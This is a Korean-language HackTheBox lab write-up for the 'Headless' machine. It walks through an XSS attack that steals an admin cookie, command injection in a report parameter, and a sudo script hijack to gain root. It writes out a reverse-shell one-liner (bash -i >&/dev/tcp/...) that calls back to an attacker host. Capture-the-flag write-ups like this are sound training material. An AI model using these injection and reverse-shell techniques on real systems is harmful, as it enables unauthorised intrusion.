# Headless - HackTheBox
## Recon
```bash
sudo nmap -p 22,5000 -sC -sV -vv -oA headless 10.10.11.8
```
<img width="1102" height="299" alt="image" src="https://github.com/user-attachments/assets/239c6dd4-14cd-49dd-843b-40b339082b9d" />

- SSH(22)
- HTTP(5000)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.10.11.8:5000

curl -IL http://10.10.11.8:5000
```
<img width="1107" height="281" alt="image" src="https://github.com/user-attachments/assets/1125e7a5-9ad9-44ec-ae2a-9a3b4bd49246" />

### gobuster
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.8:5000 -x py,md
```
- `/dashboard`가 발견되었으나 접근 불가.
<img width="1107" height="379" alt="image" src="https://github.com/user-attachments/assets/354fe124-0d9b-4413-ab13-fbe05d9ee797" />

### XSS
- `/support`에서 `message`부분에 XSS공격을 시도하면 오류가 나온다.
<img width="1100" height="492" alt="image" src="https://github.com/user-attachments/assets/5b1a44e2-51bd-41d5-b234-5ab2ba269c06" />

<br>
<br>

- `script.js`를 로컬에 생성.
<img width="1104" height="91" alt="image" src="https://github.com/user-attachments/assets/c7a292fd-a174-4eae-a393-dd2e59c72b38" />

<br>
<br>

- 헤더의 `Cookie`를 조작하여 로컬에 js를 요청하도록 하여 쿠키를 탈취할 수 있는지 시도.
<img width="716" height="20" alt="image" src="https://github.com/user-attachments/assets/33733bb1-3149-4da5-905c-7f108ad62dbc" />

<br>
<br>

- `is_admin`쿠키 탈취.
<img width="1105" height="139" alt="image" src="https://github.com/user-attachments/assets/8ebb360a-80f2-4385-a225-e1efef283dae" />

### Command Injection
- `gobuster`에서 확인한 `dashboard`로 탈취한 쿠키를 사용하여 접속 시도.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/ca5d81b7-35a8-48ef-ad89-e1908699c0a5" />

<br>
<br>

- `Generate Report` 버튼을 눌러 `burpsuite`로 가로챈 뒤에 `date`파라미터를 조작.
<img width="1100" height="297" alt="image" src="https://github.com/user-attachments/assets/3f235f8c-06eb-4940-ad62-564705db77c2" />

<br>
<br>

- 셸 커맨드 전송.(bash -c ‘bash -i >&/dev/tcp/10.10.16.4/80 0>&1’)
<img width="772" height="388" alt="image" src="https://github.com/user-attachments/assets/3b71627c-4d9d-4b5c-af20-1a8e9a9b4d6b" />

<br>
<br>

- 셸 획득.
<img width="1105" height="184" alt="image" src="https://github.com/user-attachments/assets/d36589d0-3a44-4998-b77e-7228b0318ee8" />

---
## Privesc
- `/usr/bin/syscheck`을 `root`권한으로 실행 가능.
```bash
sudo -l
```
<img width="1105" height="138" alt="image" src="https://github.com/user-attachments/assets/7990ead6-fb7b-44d7-a403-da1e4f7b562c" />

<br>
<br>

- `bash` script 파일이고, `initdb.sh`를 실행하고 있지 않으면 현재 폴더에서 `initdb.sh`를 실행하도록 하는 코드.
<img width="1105" height="534" alt="image" src="https://github.com/user-attachments/assets/1c0f6634-db9e-4c72-8108-4a9321822ebd" />

<br>
<br>

- `initdb.sh`를 로컬에 생성하여 전달.
<img width="1105" height="95" alt="image" src="https://github.com/user-attachments/assets/fa1bb97a-a3a9-4a41-9a7f-b8820135507b" />

<br>
<br>

- `/usr/bin/sysycheck`를 실행.
```bash
sudo /usr/bin/syscheck
```
<img width="1105" height="117" alt="image" src="https://github.com/user-attachments/assets/2c6d49e7-6de8-4c9d-892b-a802b1486bc4" />

<br>
<br>

- `root`셸 획득.
<img width="1105" height="165" alt="image" src="https://github.com/user-attachments/assets/5573becd-d6d2-41c6-94f1-423f27fd4dfb" />

---
## FLAG
- `/home/dvir/user.txt`
<img width="1105" height="349" alt="image" src="https://github.com/user-attachments/assets/1dde4455-41b7-40ed-a6cb-d28cc21fa2cb" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="272" alt="image" src="https://github.com/user-attachments/assets/22e7d44d-812c-4806-a994-9bea694d5bb1" />














